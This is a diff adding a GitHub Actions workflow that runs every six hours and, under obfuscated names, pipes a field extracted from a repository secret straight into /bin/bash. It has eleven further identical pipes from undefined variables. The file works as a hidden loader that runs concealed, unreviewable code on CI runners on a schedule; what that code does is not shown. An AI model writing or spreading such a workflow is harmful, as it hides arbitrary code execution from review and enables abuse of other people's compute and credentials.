@@ -1,0 +1,29 @@
+name: formulahorseshoes
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: formulahorseshoes
+        env:
+          uu6: ${{ secrets.uu6 }}
+        run: |
+          echo $uu6 | jq -r .c062 | /bin/bash
+          echo $i2580 | jq -r .mi8 | /bin/bash
+          echo $y6795 | jq -r .qug52 | /bin/bash
+          echo $idlmx34 | jq -r .fcu58695 | /bin/bash
+          echo $kaej56691 | jq -r .o577 | /bin/bash
+          echo $an7694 | jq -r .n2 | /bin/bash
+          echo $oetkg70 | jq -r .i3564 | /bin/bash
+          echo $rf89707 | jq -r .u9275 | /bin/bash
+          echo $nmp30 | jq -r .j58814 | /bin/bash
+          echo $j28137 | jq -r .nnir2 | /bin/bash
+          echo $d670 | jq -r .no36971 | /bin/bash
+          echo $dbnq718 | jq -r .oiai7 | /bin/bash
+
